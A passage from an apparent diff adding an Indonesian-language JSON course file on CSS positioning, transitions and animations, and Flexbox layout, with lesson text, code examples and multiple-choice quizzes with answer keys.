+            "question": "Sebuah elemen anak memiliki properti position: absolute; top: 0; right: 0;. Terhadap elemen manakah posisi koordinat anak tersebut akan bersandar?",
+            "options": [
+              "Elemen leluhur (ancestor/parent) terdekat yang memiliki properti position selain static (seperti relative), atau jendela dokumen jika tidak ditemukan.",
+              "Selalu bersandar pada tag <body> terlepas dari properti pembungkusnya.",
+              "Selalu bersandar pada elemen saudaranya (sibling).",
+              "Tidak bersandar pada apapun dan menghilang dari layar."
+            ],
+            "correctIndex": 0,
+            "explanation": "Elemen absolute mencari kontainer leluhur terdekat yang berposisi non-static (biasanya relative) sebagai acuan koordinat top/right/bottom/left."
+          },
+          {
+            "id": "q-3-5-2",
+            "question": "Properti posisi manakah yang paling ideal digunakan untuk membuat tombol 'Chat CS' yang tetap melayang di pojok kanan bawah layar saat halaman digulir ke bawah?",
+            "options": [
+              "position: fixed; bottom: 20px; right: 20px;",
+              "position: static; bottom: 20px; right: 20px;",
+              "position: relative; float: bottom;",
+              "display: bottom-fixed;"
+            ],
+            "correctIndex": 0,
+            "explanation": "position: fixed menempel permanen relatif terhadap viewport jendela browser terlepas dari posisi scroll pengguna."
+          },
+          {
+            "id": "q-3-5-3",
+            "question": "Apa fungsi dari properti z-index dalam tata letak CSS?",
+            "options": [
+              "Mengontrol urutan tumpukan lapisan elemen pada sumbu kedalaman 3D (Z-axis), menentukan elemen mana yang tampil di depan elemen lain.",
+              "Mengatur ketebalan garis border elemen.",
+              "Mengatur efek perbesaran teks judul.",
+              "Mengubah warna elemen menjadi transparan."
+            ],
+            "correctIndex": 0,
+            "explanation": "z-index mengontrol tumpukan visual lapisan pada elemen berposisi (non-static) untuk menentukan elemen mana yang berada di lapisan terdepan."
+          }
+        ]
+      },
+      {
+        "id": "lesson-3-6",
+        "stageId": "stage-3",
+        "slug": "transisi-dan-animasi-css-dasar",
+        "title": "Transisi & Animasi CSS Dasar (transition, @keyframes)",
+        "titleEn": "CSS Transitions & Basic Animations",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Membuat interaksi halus dengan transition (duration, timing-function, delay), transform (translate, scale, rotate), dan @keyframes.",
+        "prerequisites": [
+          "css-positioning-relative-absolute-fixed-sticky"
+        ],
+        "learningObjectives": [
+          "Menerapkan properti transition untuk menganimasikan perubahan state (seperti hover/focus) secara halus.",
+          "Memanfaatkan properti transform (translate, scale, rotate) yang diakselerasi oleh GPU.",
+          "Menyusun animasi multi-tahap menggunakan aturan @keyframes dan properti animation.",
+          "Menghindari menganimasikan properti berat seperti width/height yang memicu reflow."
+        ],
+        "whyMatters": "Micro-animations yang halus meningkatkan perceived performance dan memberikan umpan balik visual yang memuaskan bagi pengguna.",
+        "careerContext": "Developer frontend modern selalu mengoptimalkan animasi untuk berjalan di 60 FPS tanpa jank dengan memanfaatkan akselerasi hardware GPU.",
+        "commonMistakes": [
+          "Menganimasikan properti `width`, `height`, atau `top` yang membebani CPU dan menyebabkan animasi patah-patah (lag).",
+          "Membuat durasi transisi terlalu lambat (> 500ms) yang membuat antarmuka terasa lambat direspons."
+        ],
+        "keyTerms": [
+          {
+            "term": "transition",
+            "definition": "Properti untuk menginterpolasikan perubahan nilai gaya secara mulus dalam durasi waktu tertentu."
+          },
+          {
+            "term": "transform",
+            "definition": "Properti untuk mengubah bentuk, ukuran, rotasi, atau koordinat posisi elemen secara efisien melalui GPU."
+          },
+          {
+            "term": "@keyframes",
+            "definition": "Aturan CSS untuk mendefinisikan langkah-langkah tahapan frame animasi dari 0% hingga 100%."
+          },
+          {
+            "term": "Hardware Acceleration",
+            "definition": "Pengalihan proses komputasi rendering animasi ke unit pengolah grafis (GPU) browser."
+          }
+        ],
+        "contentMd": "# Transisi & Animasi CSS Dasar (transition, @keyframes)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara membuat antarmuka yang hidup dan responsif menggunakan **`transition`**, transformasi geometris yang cepat dengan **`transform`**, serta animasi multi-tahap dengan **`@keyframes`**.\n\n## Mengapa Konsep Ini Penting?\nPerubahan visual yang terjadi secara mendadak (misal warna tombol yang langsung berganti kaku) membuat aplikasi terasa kasar. Transisi halus memberikan umpan balik visual yang elegan dan meningkatkan kualitas pengalaman pengguna (*User Experience*).\n\n## 1. CSS Transition (Transisi Halus Perubahan State)\nProperti `transition` menginterpolasikan perubahan gaya antara keadaan normal dan keadaan baru (seperti `:hover` atau `:focus`):\n\n```css\n.tombol {\n  background-color: #2563eb;\n  color: white;\n  padding: 10px 20px;\n  border-radius: 6px;\n  \n  /* properti | durasi | timing function */\n  transition: background-color 0.2s ease, transform 0.2s ease;\n}\n\n.tombol:hover {\n  background-color: #1d4ed8;\n  transform: translateY(-2px); /* Mengangkat tombol 2px ke atas */\n}\n```\n\n## 2. Mengapa Memakai `transform` dan `opacity`?\nBrowser memiliki alur rendering (*Render Pipeline*): **Layout (Reflow) $\\rightarrow$ Paint $\\rightarrow$ Composite**.\n- Menganimasikan `width`, `height`, atau `top` memaksa browser menghitung ulang layout seluruh halaman (Reflow) di setiap frame $\\rightarrow$ **Membuat animasi lag / patah-patah**.\n- Menganimasikan **`transform`** (`translate`, `scale`, `rotate`) dan **`opacity`** diproses langsung oleh **GPU (Hardware Accelerated)** pada tahap Composite $\\rightarrow$ **Menghasilkan 60 FPS yang sangat mulus**.\n\n```css\n/* Contoh Transform Populer */\n.kartu:hover {\n  transform: scale(1.05); /* Membesar 5% */\n  transform: rotate(45deg); /* Berputar 45 derajat */\n  transform: translate(10px, -10px); /* Bergeser pada sumbu X dan Y */\n}\n```\n\n## 3. CSS Animation dengan `@keyframes`\nJika Anda membutuhkan animasi yang berjalan otomatis secara berulang tanpa menunggu hover pengguna, gunakan `@keyframes`:\n\n```css\n/* 1. Definisikan Tahapan Frame */\n@keyframes denyutNadi {\n  0% {\n    transform: scale(1);\n    opacity: 1;\n  }\n  50% {\n    transform: scale(1.15);\n    opacity: 0.7;\n  }\n  100% {\n    transform: scale(1);\n    opacity: 1;\n  }\n}\n\n/* 2. Terapkan pada Elemen */\n.lingkaran-status-live {\n  width: 12px;\n  height: 12px;\n  background-color: #22c55e;\n  border-radius: 50%;\n  \n  /* nama | durasi | timing | perulangan */\n  animation: denyutNadi 1.5s ease-in-out infinite;\n}\n```\n\n## Kesalahan Umum Pemula\n- **Durasi animasi terlalu lama**: Durasi interaksi tombol idealnya berada di rentang **150ms hingga 300ms** (`0.15s - 0.3s`). Durasi di atas 1 detik membuat UI terasa lambat dan lamban direspons.\n- **Menganimasikan `all` pada elemen kompleks**: `transition: all 0.3s` dapat memicu penurunan performa; selalu sebutkan properti spesifik yang ingin dianimasikan (misal: `transition: transform 0.2s, opacity 0.2s`).\n\n## Praktik Mandiri\n1. Buat sebuah kartu dengan bayangan tipis.\n2. Tambahkan transisi pada `transform` dan `box-shadow` saat `:hover` sehingga kartu tampak melayang naik ke atas dengan bayangan yang lebih tebal saat diarahkan kursor.\n\n## Ringkasan\n- **`transition`** menganimasikan perubahan nilai properti saat terjadi perubahan status (seperti hover/focus).\n- Selalu prioritaskan menganimasikan **`transform`** dan **`opacity`** demi performa 60 FPS yang mulus bebas lag.\n- **`@keyframes`** digunakan untuk membuat rangkaian animasi berulang yang berjalan otomatis.\n- Gunakan durasi interaksi singkat (**150–300ms**) agar antarmuka terasa gesit.",
+        "quizzes": [
+          {
+            "id": "q-3-6-1",
+            "question": "Properti CSS manakah yang digunakan untuk membuat perubahan nilai gaya (seperti warna tombol saat hover) berubah secara halus, bukan mendadak kaku?",
+            "options": [
+              "transition: background-color 0.3s ease;",
+              "transform: smooth;",
+              "animation-static: true;",
+              "hover-speed: 300ms;"
+            ],
+            "correctIndex": 0,
+            "explanation": "transition menginterpolasikan perubahan nilai properti CSS dalam durasi waktu tertentu dengan kurva kehalusan timing."
+          },
+          {
+            "id": "q-3-6-2",
+            "question": "Mengapa menganimasikan properti transform (translate, scale) dan opacity jauh lebih direkomendasikan daripada menganimasikan width, height, atau top?",
+            "options": [
+              "Karena transform dan opacity diproses langsung oleh GPU (Hardware Accelerated) pada tahap Composite tanpa memicu kalkulasi ulang Layout/Reflow yang berat.",
+              "Karena properti transform tidak membutuhkan kode CSS tambahan.",
+              "Karena width dan height dilarang oleh browser mobile.",
+              "Karena opacity secara otomatis mengubah format warna."
+            ],
+            "correctIndex": 0,
+            "explanation": "Transform dan opacity menghindari bottleneck kalkulasi layout/reflow pada CPU dan dieksekusi secara mulus pada GPU di kecepatan 60 FPS."
+          },
+          {
+            "id": "q-3-6-3",
+            "question": "Apa fungsi dari sintaks @keyframes dalam CSS?",
+            "options": [
+              "Mendefinisikan langkah-langkah perubahan visual frame demi frame (0% hingga 100%) dari sebuah rangkaian animasi berulang.",
+              "Menyimpan password pengguna di stylesheet.",
+              "Mengunci keyboard pengguna saat animasi berjalan.",
+              "Mengunduh font eksternal dari server."
+            ],
+            "correctIndex": 0,
+            "explanation": "@keyframes mendefinisikan tahapan keyframe animasi dari titik awal hingga akhir yang dapat dipanggil dengan properti animation."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-4",
+    "orderIndex": 4,
+    "titleId": "Modern CSS Layout: Flexbox & CSS Grid Deep Dive",
+    "titleEn": "Modern CSS Layout: Flexbox & CSS Grid Deep Dive",
+    "category": "Fundamentals",
+    "description": "Menguasai tata letak modern 1 Dimensi (Flexbox) dan 2 Dimensi (CSS Grid) untuk membangun antarmuka web yang fleksibel dan modular.",
+    "descriptionEn": "Master modern 1D (Flexbox) and 2D (CSS Grid) layouts to build responsive and modular web interfaces.",
+    "lessons": [
+      {
+        "id": "lesson-4-1",
+        "stageId": "stage-4",
+        "slug": "flexbox-container-dan-arah-sumbu",
+        "title": "Flexbox: Kontainer & Arah Sumbu (Row vs Column)",
+        "titleEn": "Flexbox: Container & Axis Direction",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memahami konsep Main Axis vs Cross Axis, flex-direction (row, column), flex-wrap, dan properti gap.",
+        "prerequisites": [
+          "transisi-dan-animasi-css-dasar"
+        ],
+        "learningObjectives": [
+          "Menjelaskan perbedaan antara Main Axis (sumbu utama) dan Cross Axis (sumbu silang).",
+          "Menerapkan display: flex dan mengontrol arah aliran item menggunakan flex-direction.",
+          "Mencegah penciutan paksa item menggunakan properti flex-wrap: wrap.",
+          "Mengatur jarak renggang seragam antar item menggunakan properti gap."
+        ],
+        "whyMatters": "Flexbox menggantikan teknik layout kuno berbasis float/table yang rapuh, memungkinkan penataan elemen 1 dimensi secara otomatis dan elastis.",
+        "careerContext": "Hampir setiap komponen navbar, tombol berdampingan, dan list di aplikasi modern dibangun menggunakan Flexbox.",
+        "commonMistakes": [
+          "Bingung membedakan sumbu utama saat `flex-direction` diubah menjadi `column` (pada column, Main Axis menjadi vertikal dan Cross Axis menjadi horizontal).",
+          "Menambahkan `margin-right` manual pada setiap item alih-alih menggunakan properti `gap`."
+        ],
+        "keyTerms": [
+          {
+            "term": "Flex Container",
+            "definition": "Elemen induk yang diberi deklarasi `display: flex`."
+          },
+          {
+            "term": "Flex Items",
+            "definition": "Elemen anak langsung di dalam sebuah Flex Container."
+          },
+          {
+            "term": "Main Axis",
+            "definition": "Sumbu utama arah aliran item (default: horizontal kiri-ke-kanan pada `row`)."
+          },
+          {
+            "term": "Cross Axis",
+            "definition": "Sumbu silang yang tegak lurus dengan Main Axis (default: vertikal atas-ke-bawah pada `row`)."
+          },
+          {
+            "term": "gap",
+            "definition": "Properti untuk memberikan jarak renggang seragam antar flex items tanpa menyentuh border luar."
+          }
+        ],
+        "contentMd": "# Flexbox: Kontainer & Arah Sumbu (Row vs Column)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari konsep dasar **CSS Flexbox (Flexible Box Layout)**: memahami perbedaan antara **Flex Container** dan **Flex Items**, konsep **Main Axis vs Cross Axis**, arah aliran **`flex-direction`**, pembungkusan baris **`flex-wrap`**, serta penggunaan **`gap`**.\n\n## Mengapa Konsep Ini Penting?\nSebelum adanya Flexbox, menyusun 3 kotak agar berjajar rapi ke samping dengan tinggi yang sama adalah pekerjaan yang sangat sulit dan memerlukan trik CSS yang rumit (*float hacks*). Flexbox diciptakan untuk menyelesaikan masalah tata letak 1 Dimensi (1D) secara cerdas dan otomatis.\n\n## 1. Flex Container dan Dua Sumbu Arah\nKetika Anda menambahkan `display: flex;` pada sebuah elemen pembungkus (Parent), elemen tersebut menjadi **Flex Container**, dan semua anak langsungnya otomatis menjadi **Flex Items**.\n\nFlexbox beroperasi di atas dua sumbu:\n- **Main Axis (Sumbu Utama)**: Arah utama di mana item-item flex dijajarkan.\n- **Cross Axis (Sumbu Silang)**: Sumbu yang memotong tegak lurus (90 derajat) terhadap Main Axis.\n\n## 2. Mengatur Arah dengan `flex-direction`\n\n```css\n.kontainer {\n  display: flex;\n  /* 1. flex-direction: row (Default) -> Main Axis = Horizontal (Kiri ke Kanan) */\n  /* 2. flex-direction: column        -> Main Axis = Vertikal (Atas ke Bawah) */\n  flex-direction: row;\n}\n```\n\n> **Poin Kritis**: Jika `flex-direction: row`, Main Axis adalah Horizontal dan Cross Axis adalah Vertikal. Jika Anda mengubahnya menjadi `flex-direction: column`, Main Axis berputar menjadi Vertikal dan Cross Axis menjadi Horizontal!\n\n## 3. Menangani Luapan Baris dengan `flex-wrap`\nSecara default, Flexbox memiliki nilai `flex-wrap: nowrap;` yang akan memadatkan dan menciutkan semua item agar muat dalam satu baris.  \nJika Anda ingin item yang tidak muat otomatis berpindah ke baris baru di bawahnya, gunakan **`flex-wrap: wrap;`**:\n\n```css\n.daftar-tag {\n  display: flex;\n  flex-wrap: wrap; /* Otomatis melompat ke baris baru */\n  gap: 12px;       /* Jarak seragam 12px antar item */\n}\n```\n\n## 4. Jarak Bersih dengan Properti `gap`\nProperti `gap: 16px;` pada Flex Container secara otomatis memberikan jarak renggang 16px antar item anak tanpa perlu menambahkan margin manual pada masing-masing item, dan tidak menyisakan margin ekstra yang merusak batas luar kontainer.\n\n## Kesalahan Umum Pemula\n- **Menaruh `display: flex` pada elemen anak**: `display: flex` selalu dipasang pada elemen INDUK pembungkus (*container*), bukan pada elemen item individual.\n- **Mengira Main Axis selalu horizontal**: Mengabaikan fakta bahwa `flex-direction: column` memutar arah sumbu utama menjadi vertikal.\n\n## Praktik Mandiri\n1. Buat kontainer `<div class=\"menu-nav\">` yang membungkus 4 buah tautan navigasi.\n2. Berikan CSS `display: flex; flex-direction: row; gap: 1rem;` untuk menata menu menjadi navbar horizontal yang rapi.\n\n## Ringkasan\n- Deklarasi **`display: flex`** mengaktifkan model Flexbox pada kontainer induk.\n- **`flex-direction: row`** (default) menata item secara horizontal, sedangkan **`column`** menata secara vertikal.\n- **`flex-wrap: wrap`** mengizinkan item berpindah ke baris baru saat ruang horizontal penuh.\n- Gunakan **`gap`** untuk memberikan jarak renggang yang seragam dan bersih antar item.",
+        "quizzes": [
+          {
+            "id": "q-4-1-1",
+            "question": "Ketika Anda memberikan deklarasi display: flex; pada sebuah kontainer div, apa arah sumbu utama (Main Axis) bawaannya (default)?",
+            "options": [
+              "flex-direction: row (horizontal dari kiri ke kanan).",
+              "flex-direction: column (vertikal dari atas ke bawah).",
+              "flex-direction: diagonal (dari sudut ke sudut).",
+              "flex-direction: wrap-reverse."
+            ],
+            "correctIndex": 0,
+            "explanation": "Arah bawaan (default) Flexbox adalah row, yang menata item anak berjajar secara horizontal sepanjang Main Axis dari kiri ke kanan."
+          },
+          {
+            "id": "q-4-1-2",
+            "question": "Properti manakah yang digunakan agar item-item flex otomatis berpindah ke baris baru ketika ruang lebar kontainer sudah penuh?",
+            "options": [
+              "flex-wrap: wrap;",
+              "flex-direction: newline;",
+              "display: multi-row;",
+              "flex-overflow: auto;"
+            ],
+            "correctIndex": 0,
+            "explanation": "Secara default Flexbox bernilai nowrap (menciutkan item). flex-wrap: wrap mengizinkan item melompat ke baris berikutnya jika ruang tidak mencukupi."
+          },
+          {
+            "id": "q-4-1-3",
+            "question": "Apa fungsi dari properti gap: 1rem; pada sebuah Flex Container?",
+            "options": [
+              "Memberikan jarak renggang seragam antar item anak tanpa perlu menambahkan margin manual pada masing-masing item.",
+              "Membuat garis border kontainer menjadi transparan.",
+              "Mengatur jarak antara halaman web dengan tepi browser.",
+              "Menghapus ruang kosong di dalam teks paragraf."
+            ],
+            "correctIndex": 0,
+            "explanation": "gap adalah properti modern untuk mengatur jarak renggang antar item Flexbox/Grid secara seragam dan rapi."
+          }
+        ]
+      },
+      {
+        "id": "lesson-4-2",
+        "stageId": "stage-4",
+        "slug": "flexbox-justify-content-dan-align-items",
+        "title": "Flexbox: Justify-Content, Align-Items & Align-Self",
+        "titleEn": "Flexbox: Justify-Content, Align-Items & Align-Self",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Mengontrol perataan sepanjang Main Axis dengan justify-content dan Cross Axis dengan align-items serta override individu dengan align-self.",
+        "prerequisites": [
+          "flexbox-container-dan-arah-sumbu"
+        ],
+        "learningObjectives": [
+          "Mengontrol perataan sepanjang Main Axis menggunakan justify-content (center, space-between, space-around, flex-start, flex-end).",
+          "Mengontrol perataan sepanjang Cross Axis menggunakan align-items (center, stretch, flex-start, flex-end).",
+          "Menerapkan teknik Perfect Centering (meratakan elemen tepat di tengah horizontal & vertikal).",
+          "Meng-override perataan satu item khusus menggunakan align-self."
+        ],
+        "whyMatters": "Mengetengahkan elemen secara horizontal dan vertikal di tengah layar adalah tugas paling sering yang dikerjakan oleh web developer.",
+        "careerContext": "Pola layout navbar (logo di kiri, menu di kanan) menggunakan `justify-content: space-between` adalah standar industri di seluruh website.",
+        "commonMistakes": [
+          "Tertukar antara `justify-content` (Main Axis) dan `align-items` (Cross Axis).",
+          "Lupa menyetel `min-height` atau `height` pada kontainer saat mencoba mengetengahkan elemen secara vertikal."
+        ],
+        "keyTerms": [
+          {
+            "term": "justify-content",
+            "definition": "Properti penentu distribusi dan perataan item di sepanjang Main Axis."
+          },
+          {
+            "term": "align-items",
+            "definition": "Properti penentu perataan item di sepanjang Cross Axis."
+          },
+          {
+            "term": "align-self",
+            "definition": "Properti pada item anak individual untuk meng-override aturan align-items dari kontainer induk."
+          },
+          {
+            "term": "space-between",
+            "definition": "Nilai perataan yang menempatkan item pertama di ujung kiri, item terakhir di ujung kanan, dan membagi sisa ruang rata di tengah."
+          }
+        ],
+        "contentMd": "# Flexbox: Justify-Content, Align-Items & Align-Self\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara mengatur perataan dan distribusi ruang kosong menggunakan **`justify-content`** (pada Main Axis), **`align-items`** (pada Cross Axis), serta menimpa perataan item individual dengan **`align-self`**.\n\n## Mengapa Konsep Ini Penting?\nBagaimana cara membuat Navbar yang meletakkan Logo di ujung kiri dan tombol Login di ujung kanan secara otomatis? Atau bagaimana cara meletakkan kartu promosi tepat di tengah-tengah layar? Kuncinya terletak pada pemahaman properti perataan Flexbox.\n\n## 1. Perataan Sumbu Utama: `justify-content`\nProperti ini mengontrol bagaimana sisa ruang kosong didistribusikan di sepanjang **Main Axis**:\n\n- **`flex-start`** (Default): Item menempel di awal sumbu.\n- **`center`**: Semua item dikumpulkan tepat di tengah.\n- **`flex-end`**: Item menempel di ujung akhir sumbu.\n- **`space-between`**: Item pertama di tepi awal, item terakhir di tepi akhir, dan sisa ruang kosong dibagi rata di antara item (Sangat populer untuk Navbar!).\n- **`space-around`**: Ruang kosong dibagi rata di sekeliling setiap item.\n- **`space-evenly`**: Jarak renggang antar item dan tepi dinding bernilai sama persis.\n\n```css\n/* Pola Klasik Navbar Modern */\n.navbar {\n  display: flex;\n  justify-content: space-between; /* Logo di kiri, Menu di kanan */\n  align-items: center;            /* Sejajar tengah secara vertikal */\n}\n```\n\n## 2. Perataan Sumbu Silang: `align-items`\nProperti ini mengontrol bagaimana item diratakan pada **Cross Axis**:\n\n- **`stretch`** (Default): Item ditarik memanjang memenuhi tinggi/lebar Cross Axis kontainer.\n- **`center`**: Item disejajarkan tepat di garis tengah vertikal.\n- **`flex-start`**: Item menempel di sisi atas Cross Axis.\n- **`flex-end`**: Item menempel di sisi bawah Cross Axis.\n\n## 3. Resep Emas: Perfect Centering (Tengah Sempurna)\nHanya dengan 3 baris CSS, Anda dapat meletakkan elemen apapun tepat di tengah-tengah layar secara horizontal dan vertikal:\n\n```css\n.layar-penuh-tengah {\n  display: flex;\n  justify-content: center; /* Rata tengah horizontal */\n  align-items: center;     /* Rata tengah vertikal */\n  min-height: 100vh;       /* Mengambil tinggi penuh layar jendela */\n}\n```\n\n## 4. Override Perataan Individual dengan `align-self`\nJika ada satu item anak yang ingin memiliki perataan Cross Axis berbeda dari saudara-saudaranya, gunakan properti **`align-self`** pada item tersebut:\n\n```css\n.kontainer {\n  display: flex;\n  align-items: center; /* Semua anak rata tengah */\n}\n\n.anak-spesial {\n  align-self: flex-end; /* Khusus anak ini menempel di bawah */\n}\n```\n\n## Kesalahan Umum Pemula\n- **Mencoba mengetengahkan vertikal tanpa tinggi kontainer**: Jika tinggi kontainer hanya setinggi teksnya sendiri, `align-items: center` tampak tidak bereaksi karena tidak ada sisa ruang vertikal untuk bergerak.\n\n## Praktik Mandiri\n1. Buat kontainer kartu hero dengan `min-height: 300px; display: flex;`.\n2. Gunakan `justify-content: center; align-items: center;` untuk menempatkan judul tepat di tengah kartu.\n\n## Ringkasan\n- **`justify-content`** mengatur distribusi ruang di sepanjang **Main Axis**.\n- **`align-items`** mengatur perataan di sepanjang **Cross Axis**.\n- **`justify-content: space-between`** adalah pola standar untuk menaruh elemen di ujung kiri dan kanan.\n- **`display: flex; justify-content: center; align-items: center;`** menghasilkan perataan tengah sempurna.\n- **`align-self`** menimpa aturan perataan untuk satu item anak spesifik.",
+        "quizzes": [
+          {
+            "id": "q-4-2-1",
+            "question": "Pada kontainer dengan flex-direction: row, properti manakah yang digunakan untuk meratakan dan mendistribusikan item pada sumbu utama (horizontal)?",
+            "options": [
+              "justify-content",
+              "align-items",
+              "align-content",
+              "text-align"
+            ],
+            "correctIndex": 0,
+            "explanation": "justify-content mengontrol perataan dan pembagian sisa ruang di sepanjang Main Axis (horizontal pada flex-direction: row)."
+          },
+          {
+            "id": "q-4-2-2",
+            "question": "Kombinasi properti Flexbox manakah yang paling ringkas dan efektif untuk meletakkan sebuah elemen tepat di tengah-tengah layar secara horizontal dan vertikal (Perfect Centering)?",
+            "options": [
+              "display: flex; justify-content: center; align-items: center;",
+              "display: flex; margin: auto-center;",
+              "display: block; center-all: true;",
+              "position: absolute; center: 50%;"
+            ],
+            "correctIndex": 0,
+            "explanation": "Kombinasi display: flex; justify-content: center; align-items: center; adalah standar modern untuk perataan tengah sempurna."
+          },
+          {
+            "id": "q-4-2-3",
+            "question": "Apa fungsi dari properti align-self pada sebuah elemen anak di dalam Flexbox?",
+            "options": [
+              "Meng-override aturan perataan Cross Axis (align-items) kontainer induk khusus untuk item individual tersebut.",
+              "Mengubah warna teks pada item anak tersebut.",
+              "Mengeluarkan elemen dari alur Flexbox menjadi elemen absolute.",
+              "Menggandakan ukuran lebar elemen anak menjadi dua kali lipat."
+            ],
+            "correctIndex": 0,
+            "explanation": "align-self memungkinkan satu elemen anak memiliki perataan Cross Axis yang berbeda dari saudara-saudaranya di dalam kontainer."
+          }
+        ]
+      },
+      {
+        "id": "lesson-4-3",
+        "stageId": "stage-4",
+        "slug": "flexbox-flex-grow-shrink-dan-basis",
+        "title": "Flexbox: Flex-Grow, Flex-Shrink & Flex-Basis",
+        "titleEn": "Flexbox Sizing: Grow, Shrink & Basis",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Menguasai ukuran dinamis item dengan flex-grow (menyerap ruang kosong), flex-shrink (mencegah penciutan), flex-basis, dan shorthand flex.",
+        "prerequisites": [
+          "flexbox-justify-content-dan-align-items"
+        ],
+        "learningObjectives": [
+          "Memahami peran flex-grow dalam menyerap sisa ruang kosong secara proporsional.",
+          "Mencegah kompresi penyusutan elemen penting (seperti icon atau avatar) menggunakan flex-shrink: 0.",
+          "Menjelaskan peran flex-basis sebagai ukuran awal sebelum proses grow dan shrink.",
+          "Menggunakan shorthand modern flex: 1 (flex: 1 1 0%) dan flex: auto."
+        ],
+        "whyMatters": "Mengatur bagaimana elemen membesar dan mengecil saat ukuran layar berubah adalah inti dari pembuatan komponen yang fleksibel dan adaptif.",
+        "careerContext": "Pola sidebar dan main-content (`sidebar: flex-shrink: 0; main: flex-grow: 1;`) digunakan di hampir semua dashboard aplikasi.",
+        "commonMistakes": [
+          "Icon di samping teks gepeng/tertekan saat teks panjang karena lupa menyetel `flex-shrink: 0` pada icon.",
+          "Menulis `flex: 1` tanpa memahami bahwa itu mereset `flex-basis` menjadi `0%`."
+        ],
+        "keyTerms": [
+          {
+            "term": "flex-grow",
+            "definition": "Faktor kemampuan flex item untuk membesar dan menyerap sisa ruang kosong pada kontainer."
+          },
+          {
+            "term": "flex-shrink",
+            "definition": "Faktor kemampuan flex item untuk menyusut saat total ukuran item melebihi kontainer."
+          },
+          {
+            "term": "flex-basis",
+            "definition": "Ukuran dimensi awal item pada sumbu utama sebelum ruang didistribusikan."
+          },
+          {
+            "term": "flex: 1",
+            "definition": "Shorthand populer untuk `flex: 1 1 0%` yang membuat semua kolom membagi ruang sama rata."
+          }
+        ],
+        "contentMd": "# Flexbox: Flex-Grow, Flex-Shrink & Flex-Basis\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari mekanisme dimensi dinamis pada item Flexbox: **`flex-grow`** (kemampuan membesar), **`flex-shrink`** (kemampuan menyusut), **`flex-basis`** (ukuran awal), serta shorthand populer **`flex: 1`**.\n\n## Mengapa Konsep Ini Penting?\nPernahkah Anda membuat layout di mana Anda ingin sebuah kolom pencarian membesar memenuhi seluruh sisa ruang yang ada, sementara tombol di sebelahnya tetap memiliki ukuran pas? Hal ini dicapai menggunakan properti fleksibilitas ukuran Flexbox.\n\n## 1. Tiga Properti Ukuran Flex Item\n\n### A. `flex-grow` (Menyerap Ruang Kosong)\n- Menentukan proporsi penyerapan sisa ruang kosong di kontainer.\n- Nilai default: `0` (item tidak akan membesar melebihi ukuran aslinya).\n- Jika disetel `flex-grow: 1`, item akan mengembang menyerap seluruh ruang kosong yang tersisa.\n\n### B. `flex-shrink` (Mencegah Penciutan)\n- Menentukan apakah item diizinkan menyusut saat kontainer terlalu sempit.\n- Nilai default: `1` (item diizinkan menciut agar tidak meluap).\n- **Trik Penting**: Menyetel **`flex-shrink: 0;`** mengunci elemen agar **TIDAK PERNAH menciut** (sangat krusial untuk foto avatar, icon, atau badge agar tidak penyok/gepeng saat teks di sebelahnya sangat panjang).\n\n### C. `flex-basis` (Ukuran Dasar Awal)\n- Menentukan ukuran ideal awal elemen sebelum `flex-grow` atau `flex-shrink` diterapkan.\n- Mirip dengan `width` pada `flex-direction: row` atau `height` pada `flex-direction: column`.\n\n## 2. Pola Praktis: Input Pencarian Elastis & Icon Terkunci\n\n```html\n<div class=\"search-bar-container\">\n  <img src=\"/search-icon.svg\" class=\"icon-pencarian\" alt=\"Search\" />\n  <input type=\"text\" class=\"input-elastis\" placeholder=\"Cari materi...\" />\n  <button class=\"btn-submit\">Cari</button>\n</div>\n\n<style>\n  .search-bar-container {\n    display: flex;\n    align-items: center;\n    gap: 8px;\n    width: 100%;\n  }\n\n  .icon-pencarian {\n    width: 24px;\n    height: 24px;\n    flex-shrink: 0; /* JANGAN PERNAH MENYUSUT / GEPENG */\n  }\n\n  .input-elastis {\n    flex-grow: 1;   /* SERAP SELURUH SISA RUANG KOSONG */\n    padding: 8px 12px;\n  }\n\n  .btn-submit {\n    flex-shrink: 0; /* Pertahankan ukuran tombol */\n  }\n</style>\n```\n\n## 3. Shorthand `flex: 1`\nDalam kode profesional, ketiga properti tersebut disingkat menggunakan shorthand `flex: [grow] [shrink] [basis]`:\n\n```css\n/* Membuat semua kolom membagi ruang sama rata secara proporsional */\n.kolom-sama-rata {\n  flex: 1; /* Setara dengan flex: 1 1 0%; */\n}\n```\n\n## Kesalahan Umum Pemula\n- **Lupa `flex-shrink: 0` pada avatar/ikon**: Membuat foto profil menjadi lonjong atau gepeng saat teks nama pengguna terlalu panjang.\n- **Mengira flex-grow hanya untuk angka 1**: Anda dapat menyetel `flex-grow: 2` pada kolom utama dan `flex-grow: 1` pada sidebar untuk membagi ruang dengan rasio 2:1.\n\n## Praktik Mandiri\n1. Buat kontainer flex dengan 2 kolom: Sidebar (`width: 250px; flex-shrink: 0;`) dan Konten Utama (`flex-grow: 1;`).\n2. Perkecil jendela browser Anda dan amati bagaimana Konten Utama menyusut secara fleksibel sementara Sidebar tetap stabil di 250px.\n\n## Ringkasan\n- **`flex-grow`** membuat item mengembang menyerap sisa ruang kosong.\n- **`flex-shrink: 0`** mengunci item agar tidak terkompresi atau gepeng saat layar menyempit.\n- **`flex-basis`** menentukan ukuran awal elemen sebelum didistribusikan.\n- **`flex: 1`** adalah shorthand standar untuk membuat kolom membagi ruang sama rata.",
+        "quizzes": [
+          {
+            "id": "q-4-3-1",
+            "question": "Apa arti dari nilai flex-grow: 1; pada sebuah elemen anak Flexbox?",
+            "options": [
+              "Elemen tersebut akan mengembang membesar untuk menyerap seluruh sisa ruang kosong yang tersedia pada kontainer secara proporsional.",
+              "Elemen tersebut akan otomatis memperbesar ukuran font teks sebesar 100%.",
+              "Elemen tersebut akan menjadi satu kali lebih tinggi daripada elemen saudaranya.",
+              "Elemen tersebut akan keluar dari kontainer induk."
+            ],
+            "correctIndex": 0,
+            "explanation": "flex-grow menentukan kemampuan item anak untuk mengembang menyerap sisa ruang ekstra pada kontainer."
